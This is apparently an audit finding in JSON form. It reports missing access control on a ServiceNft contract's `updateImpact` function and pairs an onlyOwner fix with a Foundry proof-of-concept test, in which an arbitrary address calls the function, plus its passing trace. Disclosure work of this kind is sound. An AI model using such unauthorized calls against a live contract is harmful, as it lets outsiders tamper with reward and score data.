  "body": "## Finding description and impact\nThe `updateImpact` function in the `ServiceNft` contract lacks access control, allowing any external address to modify critical impact and maturity values. This function updates `_impacts` and `_maturities` state variables and emits events that may influence system-wide calculations. Attackers could exploit this to arbitrarily alter scores, leading to incorrect data integrity, unfair rewards, or protocol manipulation. The absence of restrictions poses a high risk as core metrics can be tampered with by unauthorized parties.\n\n## Recommended mitigation steps\nImplement access control using OpenZeppelin's `Ownable` or AccessControl. Alternatively, restrict to a specific role via AccessControl. \n```diff\n+       function updateImpact(uint256 virtualId, uint256 proposalId) public onlyOwner {\n-       function updateImpact(uint256 virtualId, uint256 proposalId) public {\n```",
  "proof_of_concept": "The foundry test\ntest/ServiceNft.t.sol\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport {Test, console} from \"../lib/forge-std/src/Test.sol\";\nimport {ServiceNft} from \"contracts/contribution/ServiceNft.sol\";\nimport {IContributionNft} from \"contracts/contribution/IContributionNft.sol\";\nimport {TransparentUpgradeableProxy} from \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport {ProxyAdmin} from \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\ncontract ServiceNftTest is Test {\n    ServiceNft public snft;\n    address public contributionNft;\n    address public personaNft;\n    uint256 public virtualId;\n    uint256 public proposalId;\n    uint256 public virtualId2;\n    uint256 public proposalId2;\n\n    function setUp() public {\n        // Deploy ProxyAdmin and ServiceNft implementation\n        ProxyAdmin admin = new ProxyAdmin(msg.sender);\n        ServiceNft implementation = new ServiceNft();\n\n        // Deploy proxy and initialize\n        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(\n            address(implementation),\n            address(admin),\n            \"\"\n        );\n        snft = ServiceNft(address(proxy));\n\n        // Mock addresses for initialization\n        contributionNft = address(0x123);\n        personaNft = address(0x456);\n\n        // Initialize through the proxy\n        snft.initialize(personaNft, contributionNft, 5000);\n\n        virtualId = 3;\n        proposalId = 1;\n        \n        // Mock external calls\n        vm.mockCall(\n            contributionNft,\n            abi.encodeWithSelector(IContributionNft.getDatasetId.selector, proposalId),\n            abi.encode(uint256(0))\n        );\n    }\n\n    function test_updateImpactPrank419() public {\n        vm.prank(address(0xfeef419));\n        snft.updateImpact(virtualId,proposalId);\n    }\n    \n}\n```\n\nThe foundry test result\n```solidity\nforge test -vvvvv --match-test test_updateImpactPrank419  --via-ir\nRan 1 test for test/ServiceNft.t.sol:ServiceNftTest\n[PASS] test_updateImpactPrank419() (gas: 42776)\n…\n  [42776] ServiceNftTest::test_updateImpactPrank419()\n    ├─ [0] VM::prank(0x000000000000000000000000000000000FeEF419)\n    │   └─ ← [Return]\n    ├─ [28223] TransparentUpgradeableProxy::fallback(3, 1)\n    │   ├─ [22712] ServiceNft::updateImpact(3, 1) [delegatecall]\n    │   │   ├─ [0] 0x0000000000000000000000000000000000000123::getDatasetId(1) [staticcall]\n    │   │   │   └─ ← [Return] 0\n    │   │   ├─ emit SetServiceScore(serviceId: 1, eloRating: 0, impact: 0)\n    │   │   └─ ← [Return]\n    │   └─ ← [Return]\n    └─ ← [Return]\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.79ms (440.88µs CPU time)\n\nRan 1 test suite in 125.69ms (1.79ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```",
